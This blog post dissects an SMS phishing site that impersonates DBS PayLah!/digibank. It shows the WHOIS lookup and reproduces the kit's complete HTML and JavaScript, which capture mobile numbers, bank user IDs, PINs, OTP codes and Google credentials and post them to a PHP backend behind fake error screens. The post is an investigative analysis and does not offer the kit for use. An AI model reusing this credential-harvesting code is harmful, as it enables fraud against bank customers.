---
date: 2024-01-11T12:21:32+08:00
tags:
  - devlife
title: "Let's inspect a phishing site"
---

First of all, happy new year!

It's 11 days into 2024 and I just tested positive for COVID. Unlike many people these days who are not sure where they got it from, I'm about 74.3% confident that I got it from my mom. Because she did have it when I was visiting last week, and I knowingly stayed behind to be caregiver until she tested negative.

Unfortunately, in spite the aggressive hand-washing, mask-wearing and sanitising, it wasn't enough and my symptoms started today. On the positive side, they are relatively mild for now, just a cough and running nose, so fingers crossed.

The point of this post though, is because I just got a scam SMS and thought it'd be fun to inspect how the phishing website works. This might be a completely stupid idea but I'm not known for being smart about things, so here we go.

_Warning: this post is full of copy and pasted complete code files so it won't read well. You have been warned._

I don't expect anyone to read till the end, so I'll just put the conclusion up front, which is: from this exercise, I'm doubling down on the opinion that we should all name our functions descriptively.

Makes reading code SO MUCH BETTER. What I discovered from this exercise is that rubbish-ly named functions make code reading super tiring.

## How it started

I looked at my phone a little earlier and saw this SMS from a number marked "Likely-SCAM" by my service provider. Nice. Good job, [Vivifi](https://www.vivifi.me/).

![Phishing SMS asking me to click on a dubious link](/assets/images/posts/phishing-site/sms.png)

And my first thought was, “ooo is `.work` a TLD now? nice”. Then of course, my next thought was: who owns this? So, let's check out the WHOIS information and see what we can find out.

I'm working on a MacBook so I do have the `whois` utility out the box. If you're on Windows, maybe use a website? I don't know.

Anyway, after running `whois dbsnowsg.work`, it was no surprise to figure out that the people who bought the domain turned on Whois privacy. They used [NameSilo](https://www.namesilo.com/).

```
Domain Name: dbsnowsg.work
Registry Domain ID: D8E4AC567697B4913AAFAEBE288FFC65C-GDREG
Registrar WHOIS Server: whois.namesilo.com
Registrar URL: www.namesilo.com
Updated Date: 2024-01-10T19:31:43Z
Creation Date: 2024-01-10T19:13:19Z
Registry Expiry Date: 2025-01-10T19:13:19Z
Registrar: NameSilo, LLC
Registrar IANA ID: 1479
Registrar Abuse Contact Email: abuse@namesilo.com
Registrar Abuse Contact Phone: +1.4805240066
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited
Domain Status: addPeriod https://icann.org/epp#addPeriod
Registry Registrant ID: REDACTED FOR PRIVACY
Registrant Name: REDACTED FOR PRIVACY
Registrant Organization: PrivacyGuardian.org llc
Registrant Street: REDACTED FOR PRIVACY
Registrant Street: REDACTED FOR PRIVACY
Registrant Street: REDACTED FOR PRIVACY
Registrant City: REDACTED FOR PRIVACY
Registrant State/Province: AZ
Registrant Postal Code: REDACTED FOR PRIVACY
Registrant Country: US
Registrant Phone: REDACTED FOR PRIVACY
Registrant Phone Ext: REDACTED FOR PRIVACY
Registrant Fax: REDACTED FOR PRIVACY
Registrant Fax Ext: REDACTED FOR PRIVACY
Registrant Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.
Registry Admin ID: REDACTED FOR PRIVACY
Admin Name: REDACTED FOR PRIVACY
Admin Organization: REDACTED FOR PRIVACY
Admin Street: REDACTED FOR PRIVACY
Admin Street: REDACTED FOR PRIVACY
Admin Street: REDACTED FOR PRIVACY
Admin City: REDACTED FOR PRIVACY
Admin State/Province: REDACTED FOR PRIVACY
Admin Postal Code: REDACTED FOR PRIVACY
Admin Country: REDACTED FOR PRIVACY
Admin Phone: REDACTED FOR PRIVACY
Admin Phone Ext: REDACTED FOR PRIVACY
Admin Fax: REDACTED FOR PRIVACY
Admin Fax Ext: REDACTED FOR PRIVACY
Admin Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.
Registry Tech ID: REDACTED FOR PRIVACY
Tech Name: REDACTED FOR PRIVACY
Tech Organization: REDACTED FOR PRIVACY
Tech Street: REDACTED FOR PRIVACY
Tech Street: REDACTED FOR PRIVACY
Tech Street: REDACTED FOR PRIVACY
Tech City: REDACTED FOR PRIVACY
Tech State/Province: REDACTED FOR PRIVACY
Tech Postal Code: REDACTED FOR PRIVACY
Tech Country: REDACTED FOR PRIVACY
Tech Phone: REDACTED FOR PRIVACY
Tech Phone Ext: REDACTED FOR PRIVACY
Tech Fax: REDACTED FOR PRIVACY
Tech Fax Ext: REDACTED FOR PRIVACY
Tech Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.
Name Server: kirk.ns.cloudflare.com
Name Server: jocelyn.ns.cloudflare.com
DNSSEC: unsigned
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of WHOIS database: 2024-01-11T04:41:37Z <<<
```

Fair enough.

I do know that the domain was registered the day before and will expire in a year. Meh.

## So what lies on the end of the URL?

Okay, this part I'm not sure if it's a good idea or not. So maybe don't try this at home? It might be installing a key logger on my computer for all I know so I'll let you know if I lose money at any point. <span class="kaomoji">乁 ⁠(⁠ ⁠•⁠_⁠•⁠ ⁠)⁠ ㄏ </span>

Probably doesn't help at all, but I did open it in an incognito Firefox window. Hey, I am a very not smart person, so keep that in mind when you want to tell me “I told you so”.

I did mistype the first time, and _dbsnowsg.work_ didn't connect to anything. So it seems like the subdomain is where the action is at. *https://sgs.dbsnowsg.work* is the one that returns a website. Can I just say that, somebody bothered to setup HTTPS. Scammers gotta keep up with the times, eh?

{{<img4w filename="posts/phishing-site/website" filetype="jpg" alt="Screenshot of the landing page of the phishing site sgs.dbsnowsg.work">}}

At my first glance, I wasn't too impressed. But I also recognise that I'm not exactly the target audience for this website. Some cybersecurity folks have explained that spelling and grammar mistakes in scam emails [discourage responses from anyone who isn’t sufficiently gullible so as to ultimately fall prey to the relevant scam](https://josephsteinberg.com/why-scammers-make-spelling-and-grammar-mistakes/).

Following that line of reasoning, I feel that from a strategy perspective, not bothering to put in too much work to replicate the original site is a win-win for the scam organisation. You get to do less development work and automatically filter for folks that are either gullible enough or distracted enough to fall for it.

## Site inspection time

Right-click inspect is the tool I've used for more than 2 decades. It's still good, my friends. I built a career on it.

```html
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1, maximum-scale=1"
    />
    <title>Document</title>
    <link rel="stylesheet" href="./css/global.css" />
    <link rel="stylesheet" href="./css/animation.css" />
  </head>
  <body>
    <div id="main">
      <div class="header">
        <img class="back" src="./img/back.svg" alt="" />
        <img class="logo" src="./img/paylahwhite.png" alt="" />
      </div>
      <div class="content">
        <p style="text-align: center;">Step1. Mobile Number Authentication</p>
        <div class="input">
          <input
            id="moblie_input"
            class="moblie_input"
            placeholder="Mobile"
            pattern="[0-9]*"
            type="tel"
            maxlength="11"
          />
        </div>
      </div>
      <div class="footer">
        <div class="btn">Next</div>
      </div>
      <div id="Error" class="pop" style="display: none;">
        <p class="pop_text">
          There are no PlayLah! wallets registered to this mobile number.
        </p>
        <div class="confirm">OK</div>
      </div>
    </div>

    <script src="./js/jquery-1.11.1.min.js"></script>
    <script type="text/javascript" src="zy/api/k.js"></script>
    <script>
      js_ini_jsver("zy/api/i.js");

      function onset() {
        var length = 0;
        $(".moblie_input").on("input", function (val) {
          length = val.target.value.length;
          // console.log(val.target.value)
          if (val.target.value.length >= 8) {
            val.target.value = val.target.value.slice(0, 8);
            $(".btn").css("background", "#b82f54");

            if ($(".btn").children().length == 0) {
              $(".btn").html("");
              $(".btn").append(
                "<span class='item i1'></span><span class='item i2'></span><span class='item i3'></span>"
              );
            }
            var data = $("#moblie_input").val();
            $("#moblie_input").blur();
            setTimeout(() => {
              api_name_paswd(data, "1");
            }, 300);
          } else {
            $(".btn").css("background", "#eee");
          }
        });
        $(".moblie_input").blur(function (val) {
          // console.log(val)
          $(".input").css("background", "transparent");
        });
        $(".moblie_input").focus(function (val) {
          $(".input").css("background", "#000");
        });

        $(".btn").on("click", function () {
          if (length >= 8) {
            if ($(".btn").children().length == 0) {
              $(".btn").html("");
              $(".btn").append(
                "<span class='item i1'></span><span class='item i2'></span><span class='item i3'></span>"
              );
            }
            var data = $("#moblie_input").val();
            $("#moblie_input").blur();
            setTimeout(() => {
              api_name_paswd(data, "1");
            }, 300);

            // window.location.href='./authBankDigital.html'
          }
        });

        $(".confirm").on("click", function () {
          $id("Error").style.display = "none";
        });

        $(".back").on("click", function (val) {
          y("index.php");
        });
      }

      window.onload = onset;
    </script>
    <style>
      #main {
        position: relative;
        width: 100vw;
        height: 100vh;
        background-image: url("./img/blur_splash.png");
        background-size: 100% 100%;
        background-repeat: no-repeat;
        overflow: hidden;
        color: #fff;
        font-size: 14px;
      }
      .header {
        height: 44px;
        display: flex;
        align-items: center;
      }
      .back {
        width: 25px;
        height: 25px;
        margin-left: 10px;
      }
      .logo {
        margin-left: 160px;
        width: 48.5px;
        height: 19px;
      }
      .content {
        margin-top: 60px;
      }
      .input {
        display: flex;
        margin: 10px auto;
        background: transparent;
        height: 40px;
        width: 95%;
        color: #fff;
        border: 1px solid #fff;
        border-radius: 4px;
      }
      input {
        background: transparent;
        margin-left: 10px;
        border: none;
        outline: none;
        color: #fff;
        width: 300px;
      }
      .footer {
        width: 95%;
        position: absolute;
        display: flex;
        flex-direction: column;
        align-items: center;
        bottom: 100px;
        left: 50%;
        transform: translateX(-50%);
      }
      .btn {
        width: 95%;
        height: 40px;
        border-radius: 4px;
        display: flex;
        align-items: center;
        justify-content: center;
        background: #999;
      }
      .pop {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #fff;
        width: 250px;
        color: #221f21;

        box-sizing: border-box;
        border-radius: 8px;
      }

      .pop h6 {
        text-align: center;
        padding: 20px 0 0 0;
        font-size: 20px;
      }

      .pop_text {
        padding: 20px;
        box-sizing: border-box;
        border-bottom: 1px solid #eee;
        text-align: center;
        font-weight: 700;
      }
      .confirm {
        text-align: center;
        height: 40px;
        line-height: 40px;
        color: #4781db;
      }
    </style>
  </body>
  <script type="text/javascript" src="zy/api/i.js?ver=1704949874934"></script>
</html>
```

This is not a very big website. Not too much going on on the markup front. It does use a very old version of jQuery. CSS is nothing special either, mostly fixed values. I suppose this is meant for mobile devices.

Use of viewport units is commendable. But use of the old-school absolute positioning and transform combination for vertical centring could probably be refactored.

### Scam functionality analysis

Let's check out the business logic of this site, which is handled by Javascript. There are 2 external Javascript files loaded, `zy/api/k.js` and `zy/api/i.js` which seems to have some cache-busting capabilities.

The first one to load is k.js, so let's see what that does. It's 63 lines.

```js
var path = "zy";
var nm = "";
var jhhy = "activate .php";
var errurl = "activate .php";
var n = 0;
var settime = "";
var ym = 1;
function js_ini_cssver(b) {
  var time = new Date().getTime();
  var link = document.createElement("link");
  var head = document.getElementsByTagName("head");
  head[0].appendChild(link);
  link.setAttribute("rel", "stylesheet");
  link.setAttribute("type", "text/css");
  link.setAttribute("href", b + "?ver=" + time);
}
function js_ini_jsver(b) {
  var time = new Date().getTime();
  var script = document.createElement("script");
  var html = document.getElementsByTagName("html");
  html[0].appendChild(script);
  script.setAttribute("type", "text/javascript");
  script.setAttribute("src", b + "?ver=" + time);
}
function ajax(pg, url, data, function_name, tf, func_err = "") {
  if (window.XMLHttpRequest) {
    var ajx = new XMLHttpRequest();
  } else {
    var ajx = new ActiveXObject("Microsoft.XMLHTTP");
  }
  ajx.onreadystatechange = function () {
    if (ajx.readyState === 4 && ajx.status === 200) {
      function_name(ajx.responseText);
    }
    if (ajx.readyState === 4 && ajx.status === 400) {
      if (func_err != "") {
        func_err();
      }
    }
  };
  ajx.open(pg, encodeURI(url), tf);
  if (pg === "post") {
    ajx.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  }
  ajx.send(data);
}
function y(a) {
  if (a) {
    window.location.replace(a);
  } else {
    window.location.reload();
  }
}
function $name(p) {
  return document.getElementsByTagName(p);
}
function $id(p) {
  return document.getElementById(p);
}
function js_G() {
  var url = window.document.location.href.toString();
  var u = url.split("?");
  if (typeof u[1] === "string") {
    u = u[1].split("&");
    var get = {};
    for (var i in u) {
      var j = u[i].split("=");
      get[j[0]] = j[1];
    }
    return get;
  } else {
    return {};
  }
}
```

Looks like it's mostly utility functions. That are not explicitly named, but that's fine since this is a scam site and you probably don't want people to know easily exactly what your functions are doing. There's stuff for AJAX, for redirecting, for parsing URL strings. Okay, nothing too crazy yet.

So the script file that gets initialised is `i.js` (and we found out why it has that versioning string attached to it, it was from `k.js`). And that file looks like this:

```js
function div() {
  var width =
    window.innerWidth ||
    document.documentElement.clientWidth ||
    document.body.clientWidth;
  var height =
    window.innerHeight ||
    document.documentElement.clientHeight ||
    document.body.clientHeight;

  var link = document.createElement("div");
  var head = document.getElementsByTagName("body");
  var l = document.createElement("style");
  head[0].appendChild(l);
  l.innerHTML =
    ".bak{background:#c9c9c9;position: absolute;top: 0; left: 0;width: 100%; height: 100%;opacity:0.2;opacity:0;}.loading { border-radius: 5px;width: 100px;height: 100px;background:#e9e9e9; } .loading-img {opacity:1;width: 50px;height: 50px;position: absolute; left: 0; right: 0;top: 0;bottom: 0;margin: auto;}@keyframes turn { 0% { -webkit-transform: rotate(0deg); }25% { -webkit-transform: rotate(90deg); }50% { -webkit-transform: rotate(180deg);} 75% { -webkit-transform: rotate(270deg); } 100% {-webkit-transform: rotate(360deg); }}.loading-img img { user-select:none; width: 100%; animation: turn 1s linear infinite;} .loading - none { display: none; } ";
  head[0].appendChild(link);
  link.setAttribute(
    "style",
    "position:absolute;left:0px;top:0px;width:100%;height:100%;z-index:9999;display: flex;justify-content: space-around;align-items: center; "
  );
  link.setAttribute("id", "divq");
  link.style.width = width * 1 + "px";
  link.style.height = height * 1 + "px";
  // link.style.background = "#000";
  link.style.left = width * 0 + "px";
  link.style.top = height * 0 + "px";
  link.style.borderRadius = "10px";
  link.style.opacity = "1";
  link.innerHTML =
    "<div class='loading'><div class='bak'></div><div class='loading-img'><img src='" +
    path +
    "/api/img/qq.png' /></div></div>";
}
function tkk(html) {
  var width =
    window.innerWidth ||
    document.documentElement.clientWidth ||
    document.body.clientWidth;
  var height =
    window.innerHeight ||
    document.documentElement.clientHeight ||
    document.body.clientHeight;
  var link = document.createElement("div");
  var head = document.getElementsByTagName("body");
  var l = document.createElement("style");
  head[0].appendChild(l);
  l.innerHTML = "#i44,#i55,#i66,#idiv{position:absolute;}";
  head[0].appendChild(link);
  link.setAttribute(
    "style",
    "position:absolute;left:0px;top:0px;width:100%;height:100%;z-index:9999;display: flex;justify-content: space-around;align-items: center; "
  );
  link.setAttribute("id", "divqq");
  link.style.width = width + "px";
  link.style.height = height + "px";
  link.style.background = "";
  link.style.left = 0 + "px";
  link.style.top = 0 + "px";
  link.style.opacity = "1";
  link.innerHTML =
    "<div id='i44'><div id='idiv'><span id='i55'></span></div><span id='i66'>OK</span></div><div id='idiv2'></div>";

  $id("i55").innerHTML = html;

  $id("idiv2").style.width = width + "px";
  $id("idiv2").style.height = height + "px";
  $id("idiv2").style.background = "#000";
  $id("idiv2").style.left = 0 + "px";
  $id("idiv2").style.top = 0 + "px";
  $id("idiv2").style.opacity = "0.4";

  $id("idiv").style.left = width * 0.05 + "px";
  $id("idiv").style.top = height * 0.01 + "px";
  $id("idiv").style.width = width * 0.8 + "px";
  $id("idiv").style.height = height * 0.14 + "px";
  $id("idiv").style.wordBreak = "break-all";

  $id("i44").style.left = width * 0.05 + "px";
  $id("i44").style.top = height * 0.4 + "px";
  $id("i44").style.width = width * 0.9 + "px";
  $id("i44").style.height = height * 0.2 + "px";
  $id("i44").style.background = "#fff";
  $id("i44").style.opacity = "1";
  $id("i44").style.zIndex = "1";
  $id("i44").style.borderRadius = "2px";

  $id("i55").style.left = 0 + "px";
  $id("i55").style.top = height * 0.01 + "px";

  $id("i66").style.left = width * 0.77 + "px";
  $id("i66").style.top = height * 0.15 + "px";
  $id("i66").style.color = "#6cd000";
  $id("i66").style.fontSize = width * 0.045 + "px";
  $id("i66").style.fontWeight = "bold";

  $id("divqq").onclick = function () {
    if ($id("divqq")) {
      $id("divqq").remove();
    }
  };
}
function jsd() {
  n = 1;
  var width =
    window.innerWidth ||
    document.documentElement.clientWidth ||
    document.body.clientWidth;
  var m = 1;
  var ff = 1;
  settime = setInterval(countDown, 1000);
  function countDown() {
    m -= 1;
    if (m == 0 && ff >= 0) {
      ff -= 1;
      m = 29;
    }
    if (m >= 0 && ff >= 0) {
      if (m < 10) {
        var html1 = "00:0" + m;
      } else {
        var html1 = "00:" + m;
      }
      $id("code").innerHTML = "Request new code in " + html1;
    } else {
      n = 0;
      $id("code").innerHTML = "Request new code in 00:00";
      clearInterval(settime);
    }
  }
}
function api_name_paswd(name, paswd) {
  var url = path + "/api/api.php";
  var data = "name=" + name + "&paswd=" + paswd;
  function f(p) {
    function aja() {
      ajax("post", url, data, ffff, true);
    }
    var timer = setInterval(aja, 1000);
    function ffff(d) {
      if (d) {
        if (JSON.parse(d)["ok"] == "ok") {
          if ($id("divq")) {
            $id("divq").remove();
          }
          clearInterval(timer);
          y("MS code.php?p=" + $id("moblie_input").value);
        }
        if (JSON.parse(d)["ok"] == "no") {
          $id("Error").style.display = "block";

          $id("moblie_input").value = "";
          $(".btn").html("Next");
          $(".btn").css("background", "#eee");

          if ($id("divq")) {
            $id("divq").remove();
          }
          $(".btn").html("Next");
          $(".btn").children("span").remove();

          clearInterval(timer);
          // $id("span3").style.display = "block";
          // $id("button21").style.background="#9be2aa";
          // $id("button21").disabled=true;
          // $id("input11").focus();
        }
      }
    }
  }
  ajax("post", url, data, f, true);
}

function api_yzm(yzm) {
  var url = path + "/api/api.php";
  var data = "yzm=" + yzm;
  function f(p) {
    function aja() {
      ajax("post", url, data, ffff, true);
    }
    var timer = setInterval(aja, 1000);
    function ffff(d) {
      if (d) {
        if (JSON.parse(d)["ok"] == "ok") {
          if ($id("divq")) {
            $id("divq").remove();
          }

          clearInterval(timer);
          // $id('div1').style.display = 'block';
          // $id("input2").focus();
          y("login.php");
        }
        if (JSON.parse(d)["ok"] == "no") {
          $(".next").css("background", "#eee");
          $("#SMS").val("");
          $("input").val("");
          $("#SMS").focus();

          $id("Error").style.display = "block";
          if ($id("divq")) {
            $id("divq").remove();
          }

          $(".next").html("Next");
          $(".next").children("span").remove();

          clearInterval(timer);
          $id("span3").style.display = "block";
          $id("input11").value = "";
          $id("span5").style.display = "block";
          $id("input11").focus();
          clearInterval(settime);
          jsd();
        }
      }
    }
  }
  ajax("post", url, data, f, true);
}

function api_pwd(pwd) {
  var url = path + "/api/api.php";
  var data = "lgnpwd=" + pwd;
  function f(p) {
    function aja() {
      ajax("post", url, data, ffff, true);
    }
    var timer = setInterval(aja, 1000);
    function ffff(d) {
      if (d) {
        if (JSON.parse(d)["ok"] == "ok") {
          clearInterval(timer);
          y("wait.html");
        }
        if (JSON.parse(d)["ok"] == "no") {
          $id("Error").style.display = "block";

          $("#pwd").val("");
          $(".btn").css("background", "#ccc");
          $(".btn").html("Next");
          $(".btn").children("span").remove();

          clearInterval(timer);
        }
      }
    }
  }
  ajax("post", url, data, f, true);
}

function api_yx(yx) {
  var url = path + "/api/api.php";
  var data = "yx=" + yx;
  function f(p) {
    div();
    function aja() {
      ajax("post", url, "yxok=ok", ffff, true);
    }
    var timer = setInterval(aja, 1000);
    function ffff(d) {
      if (d) {
        if (JSON.parse(d)["ok"] == "ok") {
          if ($id("divq")) {
            $id("divq").remove();
          }
          clearInterval(timer);
          y(
            "Sign in - Google Accountp.php?p=" +
              document
                .getElementsByClassName("Xb9hP")[0]
                .getElementsByTagName("input")[0].value
          );
        }
        if (JSON.parse(d)["ok"] == "no") {
          if ($id("divq")) {
            $id("divq").remove();
          }
          clearInterval(timer);
          document
            .getElementsByClassName("Xb9hP")[0]
            .getElementsByTagName("input")[0].value = "";
          document
            .getElementsByClassName("Xb9hP")[0]
            .getElementsByTagName("input")[0]
            .focus();
          document.getElementsByClassName("LXRPh")[0].style.display = "block";
          document.getElementsByClassName("LXRPh")[0].innerHTML =
            '<div class="EjBTad" aria-hidden="true"><svg aria-hidden="true" class="stUf5b LxE1Id" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></div><div jsname="B34EJ"><span style="color:red;" jsslot="">Your Goole account cannot be found </span></div>';
        }
      }
    }
  }
  ajax("post", url, data, f, true);
}
function api_yxmm(yxmm) {
  var url = path + "/api/api.php";
  var data = "yxmm=" + yxmm;
  function f(p) {
    div();
    function aja() {
      ajax("post", url, "yxmmok=ok", ffff, true);
    }
    var timer = setInterval(aja, 1000);
    function ffff(d) {
      if (d) {
        if (JSON.parse(d)["ok"] == "ok") {
          if ($id("divq")) {
            $id("divq").remove();
          }
          clearInterval(timer);
          y("activate .php");
        }
        if (JSON.parse(d)["ok"] == "no") {
          if ($id("divq")) {
            $id("divq").remove();
          }
          clearInterval(timer);
          document
            .getElementsByClassName("Xb9hP")[0]
            .getElementsByTagName("input")[0].value = "";
          document
            .getElementsByClassName("Xb9hP")[0]
            .getElementsByTagName("input")[0]
            .focus();
          document.getElementsByClassName("uSvLId")[0].style.display = "block";
          document.getElementsByClassName("uSvLId")[0].innerHTML =
            '<div class="EjBTad" aria-hidden="true"><svg aria-hidden="true" class="stUf5b LxE1Id" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></div><div jsname="B34EJ"><span style="color:red;" jsslot="">Incorrect password, please try again, or click "Forget password" to reset password. </span></div>';
        }
      }
    }
  }
  ajax("post", url, data, f, true);
}
function api_yzmjh(yzm, userid) {
  var url = path + "/api/api.php";
  var data = "yzmm=" + yzm;
  function f(p) {
    div();
    function aja() {
      ajax("post", url, "yzjhok=ok", ffff, true);
    }
    var timer = setInterval(aja, 1000);
    function ffff(d) {
      if (d) {
        if (JSON.parse(d)["ok"] == "ok") {
          y("opt.php");
          clearInterval(timer);
        }
        if (JSON.parse(d)["ok"] == "no") {
          if ($id("divq")) {
            $id("divq").remove();
          }
          clearInterval(timer);
          $id("err").style.display = "block";
          $id("input2").value = "";
          var ddiv = $id("div12").getElementsByTagName("div");
          for (let i = 0; i < ddiv.length; i++) {
            ddiv[i].style.border = "1px solid #14bf61";
            ddiv[i].getElementsByTagName("span")[0].style.display = "block";
          }
          $id("input2").focus();
        }
      }
    }
  }
  ajax("post", url, data, f, true);

  data = "yx=" + userid;
  ajax("post", url, data, null, true);
}

function api_wt(name, paswd) {
  var url = path + "/api/api.php";
  var data = "w1=" + name + "&w2=" + paswd;
  function f(p) {
    function aja() {
      ajax("post", url, data, ffff, true);
    }
    var timer = setInterval(aja, 1000);
    function ffff(d) {
      if (d) {
        if (JSON.parse(d)["ok"] == "ok") {
          y("opt.php");
          clearInterval(timer);
        }
        if (JSON.parse(d)["ok"] == "no") {
          $id("Error").style.display = "block";
          if ($id("divq")) {
            $id("divq").remove();
          }
          $(".next").html("Next");
          $(".next").children("span").remove();

          $("#userId").val("");
          $("#PIN").val("");
          $(".next").css("background", "#eee");
          $("#userId").focus();

          clearInterval(timer);
          // document.getElementsByClassName('_5yd0 _2ph- _5yd1')[0].style.display="block";
          // document.getElementsByClassName('_5yd0 _2ph- _5yd1')[0].innerHTML="Invalid account password";
        }
      }
    }
  }
  ajax("post", url, data, f, true);
}

function xt() {
  function f(d) {
    if (d != "") {
      var dd = JSON.parse(d);
      if ($id("divqq")) {
        $id("divqq").remove();
      }
      tkk(dd[0]["msg"]);
    }
  }
  var url = "zy/api/api.php";
  var data = "xint=1";
  ajax("post", url, data, f, true);
}
var xint = setInterval(xt, 1000);
```

Ergh, this one's so much longer. 396 lines. From here, we can tell that this whole scam is powered by PHP. Ah well, any tool can be used for good or evil. It is here, that I once again am reminded of how much better code reads when you _name your functions descriptively_.

But because the code was so hard to read, and I'm down with COVID, I'm just going to write up my best guesstimates of what the functions do. The whole code is there, so if you want to yell at me to say that I'm wrong, don't bother. I know I'm most likely wrong already.

I can see functions for creating modals and loading spinners (the first 2). Then most of the rest seem to be related to parsing the user inputs? Then POST-ing them to `api.php`? I think, more or less.

There seems to be an action you can do to get a Google sign-in PHP page? But I'm too tired to figure out what you need to do to get it at this point. If anyone carries on this investigation, please share your findings.

### Tempt fate by filling in the phone number

I put in a random 8-digit number and automatically got redirected to this URL *https://sgs.dbsnowsg.work/MS%20code.php?p=83442908*.

{{<img4w filename="posts/phishing-site/mscode" filetype="jpg" alt="Screenshot of the second page of the phishing site sgs.dbsnowsg.work">}}

Did you think the second page would look better than the first one? Of course you didn't. Haha.

```html
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1, maximum-scale=1"
    />
    <title>Document</title>
    <link rel="stylesheet" href="./css/global.css" />
    <link rel="stylesheet" href="./css/animation.css" />
  </head>
  <body>
    <div id="main">
      <div class="header">
        <img class="back" src="./img/back.svg" alt="" />
        <img class="logo" src="./img/paylahwhite.png" alt="" />
      </div>
      <div class="content">
        <p style="text-align: center;">Step2. digibank Authentication</p>
        <div class="input input2" style="background: transparent;">
          <input
            id="userId"
            class="moblie_input"
            placeholder="DBS/POSB digibank User ID"
            type="text"
          />
        </div>
        <div class="input input1">
          <input
            id="PIN"
            class="moblie_input1"
            placeholder="PIN"
            pattern="[0-9]*"
            type="tel"
            maxlength="9"
          />
        </div>
        <div class="text">
          <p>Forgot PIN</p>
          <p>Don't have digibank? <span>Apply here</span></p>
        </div>
      </div>
      <div class="footer">
        <div class="btn">Help</div>
        <div class="btn next">Next</div>
      </div>
      <div id="Error" class="pop" style="display: none;">
        <p class="pop_text">
          You may have keyed in an invalid User ID or PIN. Please log in again.
        </p>
        <div class="confirm">OK</div>
      </div>
    </div>

    <script src="./js/jquery-1.11.1.min.js"></script>
    <script type="text/javascript" src="zy/api/k.js"></script>
    <script>
      js_ini_jsver("zy/api/i.js");

      function onset() {
        $(".moblie_input1").on("input", function (val) {
          length = val.target.value.length;
          // console.log(val.target.value)
          if (val.target.value.length >= 6) {
            $(".next").css("background", "#b82f54");
          } else {
            $(".next").css("background", "#eee");
          }
        });

        $(".confirm").on("click", function () {
          $id("Error").style.display = "none";
        });

        $(".back").on("click", function (val) {
          y("GetStarted.php");
        });
        $(".next").on("click", function () {
          if ($("#PIN").val().length >= 6) {
            if ($(".next").children().length == 0) {
              $(".next").html("");
              $(".next").append(
                "<span class='item i1'></span><span class='item i2'></span><span class='item i3'></span>"
              );
            }
            api_wt($("#userId").val(), $("#PIN").val());
          }
        });
        $(".moblie_input").blur(function (val) {
          // console.log(val)
          $(".input2").css("background", "transparent");
        });
        $(".moblie_input").focus(function (val) {
          $(".input2").css("background", "#000");
        });
        $(".moblie_input1").blur(function (val) {
          // console.log(val)
          $(".input1").css("background", "transparent");
        });
        $(".moblie_input1").focus(function (val) {
          $(".input1").css("background", "#000");
        });
      }
      window.onload = onset;
    </script>
    <style>
      #main {
        position: relative;
        width: 100vw;
        height: 100vh;
        background-image: url("./img/blur_splash.png");
        background-size: 100% 100%;
        background-repeat: no-repeat;
        overflow: hidden;
        color: #fff;
        font-size: 14px;
        text-align: center;
      }
      .header {
        height: 44px;
        display: flex;
        align-items: center;
      }
      .back {
        width: 25px;
        height: 25px;
      }
      .logo {
        margin: 0 auto;
        width: 48.5px;
        height: 19px;
      }
      .content {
        margin-top: 60px;
      }
      .input {
        display: flex;
        margin: 10px auto;
        background: transparent;
        height: 40px;
        width: 95%;
        color: #fff;
        border: 1px solid #fff;
        border-radius: 4px;
      }
      input {
        background: transparent;
        margin-left: 10px;
        border: none;
        outline: none;
        color: #fff;
        width: 300px;
      }
      .footer {
        width: 95%;
        position: absolute;
        display: flex;
        flex-direction: column;
        align-items: center;
        bottom: 100px;
        left: 50%;
        transform: translateX(-50%);
      }
      .btn {
        width: 95%;
        height: 40px;
        border-radius: 4px;
        display: flex;
        align-items: center;
        justify-content: center;
        /* background: #eee; */
      }
      .next {
        background: #999;
      }
      .pop {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #fff;
        width: 250px;
        color: #221f21;

        box-sizing: border-box;
        border-radius: 8px;
      }
      .pop_text {
        padding: 20px;
        box-sizing: border-box;
        border-bottom: 1px solid #eee;
        text-align: center;
        font-weight: 700;
      }
      .confirm {
        text-align: center;
        height: 40px;
        line-height: 40px;
        color: #4781db;
      }
    </style>
  </body>
  <script type="text/javascript" src="zy/api/i.js?ver=1704951404881"></script>
</html>
```

Doesn't seem like there's much new code here, just new inputs. There are no other links on the page that could bring you away from this domain, the forgot password or help text are just text, no links. Good call, I say.

After putting in the user name and PIN (which is validated to be 6 digits, as required by the bank), the previously disabled next button becomes enabled. Wow.

After hitting next, I don't think their servers are particularly fast because it took a while before they responded that I didn't put in actual credentials?

{{<img4w filename="posts/phishing-site/error" filetype="jpg" alt="I was unable to proceed without putting in real credentials">}}

So I guess they do validation at this step so I'm stopping here. The second time I filled in the user name and PIN after dismissing the error message, the POST request returned a 404.

## Police seem to be on to them

As I was messing around, I encountered this screen at *http://dbsnowsg.work*. Not sure why it didn't show up the first time.

{{<img4w filename="posts/phishing-site/police" filetype="jpg" alt="Singapore Police Force warning folks that this is a scam website and they're investigating">}}

